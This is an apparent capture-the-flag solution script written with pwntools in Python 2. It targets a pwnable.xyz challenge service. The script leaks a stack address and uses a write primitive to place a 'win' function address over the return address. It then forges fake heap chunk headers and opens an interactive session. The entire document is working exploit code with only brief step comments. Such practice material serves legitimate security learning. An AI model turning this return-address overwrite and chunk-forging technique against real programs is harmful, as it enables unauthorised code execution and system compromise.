from pwn import *

io = remote("svc.pwnable.xyz", 30005)
# io = process("./challenge")

def option(i):
	io.sendlineafter("> ", str(i))
def writeNext(qword, nextAddr):
	option(1)
	io.send(p64(qword) + p64(nextAddr))
	option(3)

# 1. leak adddress of stack
win = 0x00400a3e
option(2)
ret = int(io.recvline(), 16) + 0x58
print "ret at {}".format(hex(ret))

# 2. write to it
writeNext(0, ret)
chunkAt = ((ret + 0x20 - 1)/0x20)*0x20
print "chunkAt {}".format(hex(chunkAt))
writeNext(win, chunkAt)

# 3. start crafting the valid chunk
writeNext(0x20, chunkAt + 0x8)
writeNext(0x21, chunkAt + 0x20)

writeNext(0x20, chunkAt + 0x28)
writeNext(0x21, chunkAt + 0x10)	# memToChunk

io.interactive()
